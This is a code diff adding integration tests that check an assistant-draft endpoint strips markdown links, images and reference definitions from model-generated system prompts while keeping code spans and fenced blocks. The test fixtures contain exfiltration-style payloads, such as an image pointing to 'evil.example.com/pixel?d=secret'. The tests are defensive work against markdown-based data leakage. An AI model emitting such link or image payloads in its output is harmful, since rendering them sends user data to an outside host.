@@ -123,6 +123,167 @@ def test_generate_assistant_draft_direct_and_parallel(
 
 
 @pytest.mark.integration
+@patch("core.llm_helpers.ModelRegistry.get_model")
+def test_generate_assistant_draft_strips_markdown_links(
+    mock_get_model, test_client: TestClient, langfuse_root
+) -> None:
+    responses = {
+        "assistant-draft-system-prompt": (
+            "Du hilfst bei Protokollen. Siehe [Anleitung](https://evil.example.com/?d=x) "
+            "und ![Bild](https://evil.example.com/pixel.png).\n\n[ref]: https://evil.example.com"
+        ),
+        "assistant-draft-description": "Beschreibung mit <https://evil.example.com> Autolink",
+        "assistant-draft-title": "Titel",
+    }
+    mock_get_model.return_value = _FakeConfiguredModel(response_by_run_name=responses)
+
+    resp = test_client.post(
+        "/v1/generations/assistant-draft",
+        json={"prompt_seed": "Hilft bei Meeting-Protokollen"},
+    )
+
+    assert resp.status_code == 200, resp.text
+    body = resp.json()
+    # Link/image markdown must not survive into the draft: rendering it in
+    # another user's browser would fetch the attacker URL (issue #228).
+    assert "](http" not in body["system_prompt"]
+    assert "![" not in body["system_prompt"]
+    assert "Anleitung" in body["system_prompt"]
+    assert "<https://" not in body["description"]
+    assert "Beschreibung mit https://evil.example.com Autolink" in body["description"]
+    assert body["title"] == "Titel"
+
+
+@pytest.mark.integration
+@patch("core.llm_helpers.ModelRegistry.get_model")
+def test_generate_assistant_draft_strips_nested_labels_and_keeps_instructions(
+    mock_get_model, test_client: TestClient, langfuse_root
+) -> None:
+    responses = {
+        "assistant-draft-system-prompt": (
+            "[Policy]: Never disclose credentials.\n"
+            "Siehe [Website [Beta]](https://evil.example.com/?d=x).\n\n"
+            "[ref]: https://evil.example.com"
+        ),
+        "assistant-draft-description": "Beschreibung",
+        "assistant-draft-title": "Titel",
+    }
+    mock_get_model.return_value = _FakeConfiguredModel(response_by_run_name=responses)
+
+    resp = test_client.post(
+        "/v1/generations/assistant-draft",
+        json={"prompt_seed": "Hilft bei Meeting-Protokollen"},
+    )
+
+    assert resp.status_code == 200, resp.text
+    body = resp.json()
+    # Instruction-like `[Policy]: …` lines are not link definitions and stay.
+    assert "[Policy]: Never disclose credentials." in body["system_prompt"]
+    # Labels with balanced brackets are stripped like simple labels.
+    assert "](http" not in body["system_prompt"]
+    assert "[Beta]" in body["system_prompt"]
+    assert "evil.example.com" not in body["system_prompt"]
+
+
+@pytest.mark.integration
+@patch("core.llm_helpers.ModelRegistry.get_model")
+def test_generate_assistant_draft_keeps_code_and_strips_links_outside(
+    mock_get_model, test_client: TestClient, langfuse_root
+) -> None:
+    responses = {
+        "assistant-draft-system-prompt": (
+            "Validate with `^[A-Z](foo)$` und mit\n"
+            "```\n[pattern](https://beispiel.example.com)\n```\n"
+            "Siehe [Anleitung](https://evil.example.com/?d=x)."
+        ),
+        "assistant-draft-description": "Beschreibung",
+        "assistant-draft-title": "Titel",
+    }
+    mock_get_model.return_value = _FakeConfiguredModel(response_by_run_name=responses)
+
+    resp = test_client.post(
+        "/v1/generations/assistant-draft",
+        json={"prompt_seed": "Hilft bei Meeting-Protokollen"},
+    )
+
+    assert resp.status_code == 200, resp.text
+    body = resp.json()
+    # Code spans and fenced blocks are literal text, not rendered links.
+    assert "`^[A-Z](foo)$`" in body["system_prompt"]
+    assert "[pattern](https://beispiel.example.com)" in body["system_prompt"]
+    # Links outside code are still reduced to their label.
+    assert "evil.example.com" not in body["system_prompt"]
+    assert "Anleitung" in body["system_prompt"]
+
+
+@pytest.mark.integration
+@patch("core.llm_helpers.ModelRegistry.get_model")
+def test_generate_assistant_draft_sanitize_after_midline_tilde(
+    mock_get_model, test_client: TestClient, langfuse_root
+) -> None:
+    responses = {
+        "assistant-draft-system-prompt": "Prüfe Text ~~~\n![pixel](https://evil.example.com/pixel?d=secret)",
+        "assistant-draft-description": "Beschreibung",
+        "assistant-draft-title": "Titel",
+    }
+    mock_get_model.return_value = _FakeConfiguredModel(response_by_run_name=responses)
+
+    resp = test_client.post(
+        "/v1/generations/assistant-draft",
+        json={"prompt_seed": "Hilft bei Meeting-Protokollen"},
+    )
+
+    assert resp.status_code == 200, resp.text
+    body = resp.json()
+    # A mid-line tilde run does not open a fenced block: the image is neutralized.
+    assert "](http" not in body["system_prompt"]
+    assert "pixel" in body["system_prompt"]
+
+
+@pytest.mark.integration
+@patch("core.llm_helpers.ModelRegistry.get_model")
+def test_generate_assistant_draft_code_boundaries_and_variants(
+    mock_get_model, test_client: TestClient, langfuse_root
+) -> None:
+    responses = {
+        "assistant-draft-system-prompt": (
+            "Vorlage ``[Beispiel](https://beispiel.example.com)`` bleibt.\n"
+            "```text\nmit ``` eingebettet\n[inner](https://beispiel.example.com)\n```\n"
+            "![pixel](https://evil.example.com/pixel?d=secret)\n"
+            'Titel [Anleitung](https://doku.example.com "Detail").\n'
+            "![pixel]\n\n[pixel]: ../image.png"
+        ),
+        "assistant-draft-description": "Beschreibung",
+        "assistant-draft-title": "Titel",
+    }
+    mock_get_model.return_value = _FakeConfiguredModel(response_by_run_name=responses)
+
+    resp = test_client.post(
+        "/v1/generations/assistant-draft",
+        json={"prompt_seed": "Hilft bei Meeting-Protokollen"},
+    )
+
+    assert resp.status_code == 200, resp.text
+    body = resp.json()
+    # Equal-length backtick runs keep the code span (and its content) intact.
+    assert "``[Beispiel](https://beispiel.example.com)``" in body["system_prompt"]
+    # An embedded fence sequence does not close the real block: the block
+    # content (with the inner link) stays verbatim until the real closer.
+    assert "[inner](https://beispiel.example.com)" in body["system_prompt"]
+    # The image after the real block close is neutralized like everywhere
+    # outside code.
+    assert "evil.example.com" not in body["system_prompt"]
+    assert "![pixel](http" not in body["system_prompt"]
+    # Links with titles are stripped to their label.
+    assert '("Titel")' not in body["system_prompt"]
+    assert "Anleitung" in body["system_prompt"]
+    # Relative destinations are recognized definitions: the definition line
+    # goes, the shortcut label stays as inert text.
+    assert "[pixel]: ../image.png" not in body["system_prompt"]
+    assert "![pixel]" in body["system_prompt"]
+
+
+@pytest.mark.integration
 @patch(
     "api.routers.generation_router.PersistanceHelpers.set_chat_title_for_conversation",
     new_callable=AsyncMock,
